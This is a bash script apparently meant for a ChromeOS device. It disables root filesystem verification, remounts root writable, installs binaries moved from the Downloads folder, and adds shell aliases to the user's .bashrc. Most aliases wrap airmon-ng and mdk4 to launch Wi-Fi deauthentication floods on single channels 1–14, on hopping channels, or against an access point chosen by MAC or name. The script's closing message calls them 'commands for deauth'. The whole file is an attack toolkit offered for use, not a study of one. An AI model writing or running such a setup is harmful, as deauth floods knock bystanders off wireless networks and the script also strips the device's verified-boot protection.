#!/bin/bash

check_writeable_rootfs() {

if [  -e /etc/aroc_writable_test ]; then
rm /etc/aroc_writable_test
fi

touch /etc/aroc_writable_test  2> /dev/null

  if [ ! -e /etc/aroc_writable_test ]; then
  echo "Unable to modify system so making some changes !"
  echo "Disabling rootfs verification by running:"
  sudo /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification --partitions $(( $(rootdev -s | sed -r 's/.*(.)$/\1/') - 1))
  sudo reboot
  exit 1
fi

sudo rm /etc/aroc_writable_test

}
  
main() {
        
sudo mount -o remount,rw / 2> /dev/null

sleep 0.2

echo "Credit MarsDroid."

sleep 0.02
echo
sleep 0.02
echo
sleep 0.02
echo
sleep 0.02
echo
sudo mkdir /usr/local/sbin/
sudo chmod a+x /home/chronos/user/MyFiles/Downloads/sbin/* && sudo mv /home/chronos/user/MyFiles/Downloads/sbin/* /usr/local/sbin/
sudo chmod a+x /home/chronos/user/MyFiles/Downloads/so/* && sudo mv /home/chronos/user/MyFiles/Downloads/so/* /usr/local/lib64/
sudo rm -rf /home/chronos/user/MyFiles/Downloads/sbin/ && sudo rm -rf /home/chronos/user/MyFiles/Downloads/so/
sudo rmdir /home/chronos/user/MyFiles/Downloads/sbin && sudo rmdir /home/chronos/user/MyFiles/Downloads/so
sed -i 19i"alias scan5='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon --band a'" /home/chronos/user/.bashrc
sed -i 19i"alias scan2='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon --band bg'" /home/chronos/user/.bashrc
sed -i 19i"alias scan='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng wlan0mon --band abg'" /home/chronos/user/.bashrc
sed -i 19i"alias mdk4ap='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon a -a'" /home/chronos/user/.bashrc
sed -i 19i"alias mdk4all='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 1,2,3,4,5,6,7,8,9,10,11,12,13:150'" /home/chronos/user/.bashrc
sed -i 19i"alias mdk4hop='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c h:150'" /home/chronos/user/.bashrc
sed -i 19i"alias mdk4c='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c'" /home/chronos/user/.bashrc
sed -i 19i"alias stopkill='sudo airmon-ng stop wlan0mon'" /home/chronos/user/.bashrc
sed -i 19i"alias mdk4ap='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon a -a'" /home/chronos/user/.bashrc
sed -i 19i"alias kill1='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 1:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill2='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 2:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill3='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 3:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill4='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 4:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill5='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 5:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill6='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 6:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill7='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 7:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill8='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 8:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill9='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 9:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill10='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 10:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill11='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 11:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill12='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 12:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill13='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 13:150'" /home/chronos/user/.bashrc
sed -i 19i"alias kill14='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c 14:150'" /home/chronos/user/.bashrc
sed -i 19i"alias killapmac='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c h -B '" /home/chronos/user/.bashrc
sed -i 19i"alias killapname='sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo mdk4 wlan0mon d -c h -E '" /home/chronos/user/.bashrc
sed -i 19i"alias sysro='sudo mount -o remount,ro /'" /home/chronos/user/.bashrc
sed -i 19i"alias sysrw='sudo mount -o remount,rw /'" /home/chronos/user/.bashrc
sudo rm /home/chronos/user/MyFiles/Downloads/run.sh
echo "DONE Now reboot enter shell and type alias to see commands for deauth"
}

main "$@"
